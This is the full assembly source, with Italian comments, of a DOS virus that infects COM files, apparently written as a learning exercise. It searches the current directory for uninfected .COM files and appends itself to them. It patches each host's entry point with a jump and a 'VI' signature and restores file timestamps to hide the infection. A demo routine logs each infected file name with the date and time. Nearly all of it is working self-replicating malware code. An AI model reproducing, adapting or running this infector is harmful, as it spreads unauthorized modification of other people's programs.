MAIN SEGMENT BYTE
	ASSUME CS:MAIN, DS: MAIN, SS: NOTHING
	ORG 100H

;***************************************************************************************************
;*** HOST : un falso host che ci farà da "portatore", non fa altro che saltare alla routine del virus			***
;***************************************************************************************************

HOST: 
		jmp NEAR PTR VIRUS_START		; salta all'inizio del codice del virus
		db 'VI'			  				; la firma del virus	
		db 100h dup (90h) 				; forziamo l'assemblatore a compilare la jump come near con 256 nop
		mov ah, 4ch		  				; termina normalmente e torna a DOS	
		mov al, 0						; con codice di errore 0
		int 21h
	
; i dati non inizializzati(tutti a parte COMFILE, LOGFILE e START_CODE)  sono posizionati alla fine del segmento sotto la stack del virus
; in questo modo non ho bisogno di calcolare ogni volta l'offset e la variabile VIR_START va a sovrascrivere l'indirizzo di ritorno della prima call 
	
VIRUS:									; primo byte del virus

	COMFILE DB '*.COM', 0               ; usato nella routine di ricerca  
	LOGFILE DB 'log.txt',24h			; usati solo in MOSTRA
	MSG DB ' e stato infettato', 24H	; usati solo in MOSTRA


;***************************************************************************************************
;*** Routine principale  - "Main" del virus												***	
;***  1) trova file																***	
;*** 2) infetta 																***	
;*** 3) [mostra]																***	
;*** 4) rimetti a posto i primi 5 byte in memoria  del host e la DTA								***	
;*** 5) passa il controllo al host 													***	
;***************************************************************************************************
	
VIRUS_START:							; inizio codice

	; inizio con una call, così da mettere l'indirizzo di GET_START in cima alla stack, dove sarà sovrascritto dalla variabile VIR_START
	call GET_START

GET_START:
	
	; a VIR_START aggiungo anche la parte prima di GET_START in modo da farla puntare effettivamente all'inizio del virus
	sub WORD PTR [VIR_START], OFFSET GET_START - OFFSET VIRUS 
	mov dx, OFFSET DTA 					; set new DTA , ds: dx = nuova posizione della DTA 				
	mov ah, 1ah  						; per ora la variabile DTA alla fine della stack
	int 21h
	
	call FIND_FILE 						; routine di ricerca file, ritorna il nome del file in FNAME
	jnz EXIT_VIRUS 						; not zero = file non trovato, zn = file OK
	
	call INFECT							; infetta il file di nome FNAME
	call MOSTRA 						; routine puramente dimostrativa:  mostra il nome del file sullo schermo e scrivilo nel file di log
	
EXIT_VIRUS:
	
	mov dx, 80h							; rimetti a posto il DTA all'indirizzo 80h del segmento (nella PSP)
	mov ah, 1ah
	int 21h 	
	
	mov bx, [VIR_START] 				; metti nei primi 5 byte del host in memoria start_code
	mov ax, WORD PTR [ bx + (OFFSET START_CODE) - (OFFSET VIRUS)]
	mov WORD PTR [HOST], ax				; lo start_code contiene i primi 5 byte originari del file host
	mov ax, WORD PTR [ bx + (OFFSET START_CODE) - (OFFSET VIRUS)+2]
	mov WORD PTR [HOST+2], ax
	mov al, BYTE PTR [ bx + (OFFSET START_CODE) - (OFFSET VIRUS)+4]
	mov BYTE PTR [HOST+4], al
	
	mov [VIR_START], 100h 				; mette in IP l'ultimo elemento presente nella stack = VIR_START 
	ret 				  				; ritorna il controllo al host
	
START_CODE:
	nop									; qui metteremo i primi 5 byte di codice del host
	nop
	nop
	nop
	nop

;***************************************************************************************************
;*** Routine di ricerca file "non molto invasiva"  - cerca il primo file COM nella cartella corrente			***	
;***  ritorna nz= errore, zn= file ok, in FNAME la stringa con il nome del file						***	
;***************************************************************************************************

FIND_FILE:
	mov dx, [VIR_START] 				; comfile è all'indirizzo 0 del virus...
	mov cx, 3fh 						; find first file, cx= file attribute mask in questo caso, tutti i file
	mov ah, 4eh 						; ds: dx = ASCIIZ file specification = i file com
	int 21h     						; ritorna ax= error code e il nome del file nella DTA

FF_LOOP:
	or al, al 							; se è 0 va bene
	jnz FF_DONE 						; c'è stato un errore, usciamo con nz
	call FILE_OK						; altrimenti vediamo se il file è infettabile
	jz FF_DONE 							; set zero  = file ok
	
	mov ah, 4fh							; find next file - usa gli stessi parametri della find first file
	int 21h 							
	jmp FF_LOOP							; c'è stato un errore?

FF_DONE:								; esci con zn = file OK
	ret									; nz = errore

;***************************************************************************************************
;*** Routine di "infettabilità" del file - il file è ok se :										***
;*** 1) c'è abbastanza spazio per il virus (senza eccedere il limite di 64KB)						***
;*** 2) non è già infetto - leggiamo i primi 5 byte in start_image e controlliamo se c'è near jmp e la signature	***	
;***************************************************************************************************	

FILE_OK:
	mov dx, OFFSET FNAME				; apri il file di nome ds:dx
	mov ax, 3d02h 						; in lettura e scrittura
	int 21h								; ritorna il file handle in ax, set carry on error
	jc FOK_NZEND						; se c'è errore esci	
	
	mov bx, ax 							; bx = file handle
	push bx								; salviamo bx	
	mov cx, 5							; leggi cx bytes
	mov dx, OFFSET START_IMAGE			; in ds: dx
	mov ah, 3fh 						; leggi i primi 5 bytes del file da infettare in start_image
	int 21h
	
	pop bx								; close file 	
	mov ah,3eh 
	int 21h

	mov ax, WORD PTR [FSIZE]			; ci stiamo tutti in 64kb?
	add ax, OFFSET ENDVIRUS - OFFSET VIRUS ; fsize + size del virus (endvirus equ $+212 di dati)
	jc FOK_NZEND						; se c'è errore esci - file troppo grande
	
	cmp BYTE PTR [START_IMAGE], 0E9H 	; first byte is a near jump?
	jnz FOK_ZEND						; no, quindi non è infetto - OK
		
	cmp WORD PTR [START_IMAGE + 3], 4956H ; VI?
	jnz FOK_ZEND						; no, quindi non è infetto -OK
	
FOK_NZEND:
	mov al, 1							; c'è stato un errore
	or al, al 							; esco con nz
	ret
FOK_ZEND:
	xor al, al 							; OK - esco con z
	ret

;***************************************************************************************************
;*** Routine di infezione:														***	
;*** 1) apri file trovato in find_file													***	
;*** 2) scrivi il virus alla fine del file												***	
;*** 3) scrivi in start_code sul disco i primi 5 byte letti (che ora sono start_image)					***	
;*** 4) scrivo la jmp iniziale, calcolando l'offset del virus 									***	
;*** 5) ripristino gli attributi del file, salvati con la DTA									***	
;***************************************************************************************************	

INFECT:
	mov dx, OFFSET FNAME  				; apri file in lettura/scrittura
	mov ax, 3d02h 						; ds:dx = nome file
	int 21h								; ritorna handle del file in ax	
	mov WORD PTR [HANDLE], ax			; lo salvo in file handle
	
	xor cx, cx							; sposto il puntatore alla fine	
	mov dx, cx							; cx: dx offset dalla posizione indicata
	mov bx, WORD PTR [HANDLE]			; bx handle
	mov ax, 4202h						; al = 02 dalla fine	
	int 21h 
	
	mov cx, OFFSET FINAL - OFFSET VIRUS ; lunghezza del virus senza la stack
	mov dx, [VIR_START]					; scrivi dall'inizio del virus
	mov bx, WORD PTR [HANDLE]			; nel file in bx
	mov ah, 40h 						; scrivo il virus in memoria alla fine del file da infettare
	int 21h
	
	xor cx, cx							; punto alla variabile start_code su disco	
	mov dx, WORD PTR [FSIZE] 			; nel codice del virus, offset dx dall'inizio file
	add dx, OFFSET START_CODE - OFFSET VIRUS ;
	mov bx, WORD PTR [HANDLE]
	mov ax, 4200h 
	int 21h 
	
	mov cx, 5							; scrivo i 5 byte appena letti del file su disco (in FILE_OK)
	mov bx, WORD PTR [HANDLE]			; in start_code
	mov dx, OFFSET START_IMAGE			; in modo da riuscire a ripristinarli, quando eseguirò il file infetto
	mov ah, 40h 
	int 21h
	
	xor cx, cx							; punto all'inizio del file
	mov dx, cx							; così possiamo scrivere la jmp iniziale
	mov bx, WORD PTR [HANDLE]
	mov ax, 4200h
	int 21h 
	
	mov bx, [VIR_START]					; uso start_image per formare l'indirizzo della jump
	mov BYTE PTR [START_IMAGE], 0e9h 	; codice della near jmp
	mov ax, WORD PTR [FSIZE]			; fsize + salto i dati inizializzati - 3 (essendo relativa)
	add ax, OFFSET VIRUS_START - OFFSET VIRUS - 3 ; dimensione near jump = 3byte
	mov WORD PTR [START_IMAGE+1], ax	; scrivi in start_image l'indirizzo
	mov WORD PTR [START_IMAGE+3], 4956h	; e la signature 'VI'
	
	mov cx, 5							; scrivi i 5 byte appena formati all'inizio del file
	mov dx, OFFSET START_IMAGE 			; ds:dx pointer to start_image
	mov bx, WORD PTR[HANDLE]
	mov ah, 40h
	int 21h
	
	mov ax, 5701h 						; set file time/date - ripristina i valori salvati
	mov bx, WORD PTR [HANDLE]			; bx handle
	mov dx, WORD PTR[FDATE]				; dx fdate
	mov cx, WORD PTR[FTIME]				; cx ftime	
	int 21h
	
	mov ah, 3eh 						; chiudi il file infetto
	int 21h
	
	ret									; torna al main e fai eseguire il host

;***************************************************************************************************
;*** Routine dimostrativa; mostra il nome del file su schermo e lo scrive nel file di log					***	
;***************************************************************************************************
	
MOSTRA:
		
	mov dx, OFFSET FNAME				; mostra su schermo la stringa in ds:dx
	mov WORD PTR [HANDLE], 24h 			; metti $ alla fine della stringa
	mov ah, 9							; mostra FNAME
	int 21h 
	
	mov dx, [VIR_START]					; mostra la stringa predefinita su schermo
	add dx, OFFSET MSG - OFFSET VIRUS	; essendo già inizializzata non è messa nella stack
	mov ah, 9							; però posso usare VIR_START per calcolarla
	int 21h 
	
	mov dx, [VIR_START]					; apri il file di log in scrittura
	add dx, OFFSET LOGFILE - OFFSET VIRUS ; ottengo il file handle in ax
	mov ax, 3d01h 						
	int 21h
	jc EXIT_VIRUS						; se c'è errore continua da qui
	
	mov WORD PTR [HANDLE], ax			; usiamo HANDLE per il file di log
	mov bx, WORD PTR [HANDLE]			; non ci serve più per il file infetto
	xor cx, cx							; bx = handle del log
	mov dx, cx							; spostiamo il pointer alla fine
	mov ax, 4202h
	int 21h 
	
	mov ah,2Ch 							; get System Time  ch= hour, cl = minutes, dh = sec
	int 21h
	mov BYTE PTR [START_IMAGE], ch		; salviamo l'ora in start_image
	mov BYTE PTR [START_IMAGE+1], cl	; i minuti in start_image+1	
	
	mov ah,2Ah 							; get System Date  cx = year, dh = month, dl = day
    int 21h
	mov BYTE PTR [START_IMAGE+2], dl	; giorno
	mov BYTE PTR [START_IMAGE+3], dh	; mese
	mov BYTE PTR [START_IMAGE+4], cl	; anno
	
	mov bx, WORD PTR [HANDLE]			; bx = handle del log
	mov cx, 20 							; lunghezza del FNAME+ HANDLE + START_IMAGE
	mov dx, OFFSET FNAME				; scrivo il nome del file nel log
	mov ah, 40h 						; e l'ora / data di infezione
	int 21h
	
	mov ah, 3eh 						; close log
	int 21h
	ret
	
	
FINAL:									; ultimo byte del virus

ENDVIRUS EQU $ + 212 					; 212 = FFFF- FF2A- 1 dimensione dei dati 

	ORG 0ff2ah
	
; i dati sono stati messi subito dopo la stack, in una posizione fissa, la variabile VIR_START va a coprire l'indirizzo di ritorno
; della prima call, cioè l'inizio del file
	
DTA DB 16h  dup (?) 		; fino 16h DTA "inutile" per noi
FTIME DW 0					; gli attributi originali del file
FDATE DW 0					; la data e l'ora di ultima modifica
FSIZE DW 0,0				; la dimensione del file	
FNAME DB 13 dup (0)			; nome del file da infettare
HANDLE DW 0					; il handle del file
START_IMAGE DB 0,0,0,0,0	; immagine dei primi 5 byte del file da infettare	
VSTACK DW 50h dup(?)		; 50h basteranno? stack del virus
VIR_START DW ?				; inizio del virus, copre l'indirizzo di ritorno della prima call FFFE

MAIN ENDS

END HOST
	
	
	
	